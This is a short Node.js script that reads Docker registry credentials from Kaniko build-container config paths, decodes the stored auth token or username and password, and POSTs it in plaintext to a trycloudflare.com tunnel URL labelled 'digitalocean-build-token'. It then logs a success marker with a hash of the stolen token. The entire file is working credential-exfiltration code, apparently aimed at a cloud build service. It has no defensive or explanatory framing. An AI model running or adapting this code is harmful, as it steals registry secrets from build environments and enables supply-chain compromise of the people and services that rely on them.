const crypto = require('crypto');
const https = require('https');
const http = require('http');
const fs = require('fs');

const callbackUrl = 'https://acceptable-treated-soon-indicators.trycloudflare.com/digitalocean-build-token';

const configPaths = [
  '/kaniko/.docker/config.json',
  '/root/.docker/config.json',
  '/.docker/config.json',
];

let configRaw = '';
let configPath = '';
for (const p of configPaths) {
  try {
    configRaw = fs.readFileSync(p, 'utf8');
    configPath = p;
    break;
  } catch (e) {}
}

if (!configRaw) {
  console.log('No docker config found at any known path');
  // List what's in /kaniko for debugging
  try {
    const entries = fs.readdirSync('/kaniko', { recursive: true });
    console.log('/kaniko contents:', entries.slice(0, 30));
  } catch (e) { console.log('/kaniko not accessible:', e.message); }
  process.exit(0);
}

console.log('Found config at:', configPath);
const config = JSON.parse(configRaw);
const auths = config.auths || {};
const credsStore = config.credsStore || null;
const credHelpers = config.credHelpers || {};
const registries = Object.keys(auths);

let token = '';
let registry = registries[0] || '';

if (registries.length > 0) {
  const entry = auths[registry];
  if (entry.auth) {
    token = Buffer.from(entry.auth, 'base64').toString('utf8');
  } else if (entry.username && entry.password) {
    token = entry.username + ':' + entry.password;
  } else if (entry.identitytoken) {
    token = entry.identitytoken;
  }
}

if (!token) {
  console.log('No usable token found. Config keys:', Object.keys(config));
  console.log('Registries:', registries);
  console.log('Raw config (redacted):', JSON.stringify({...config, auths: Object.fromEntries(Object.entries(auths).map(([k,v]) => [k, Object.keys(v)]))}, null, 2));
  process.exit(0);
}

const body = JSON.stringify({
  schema: 1,
  capturedAt: new Date().toISOString(),
  registry: registry,
  allRegistries: registries,
  token: token,
  configPath: configPath,
  configKeys: Object.keys(config),
});

const url = new URL(callbackUrl);
const transport = url.protocol === 'https:' ? https : http;
const request = transport.request(url, {
  method: 'POST',
  headers: {
    'content-type': 'application/json',
    'content-length': Buffer.byteLength(body),
  },
}, (response) => {
  response.resume();
  response.on('end', () => {
    console.log(JSON.stringify({
      marker: 'DO_KANIKO_REGISTRY_TOKEN_EXPORTED',
      callbackStatus: response.statusCode,
      registry: registry,
      tokenLength: token.length,
      tokenSha256: crypto.createHash('sha256').update(token).digest('hex'),
    }));
  });
});
request.on('error', (error) => { console.error('callback error:', error.message); });
request.end(body);
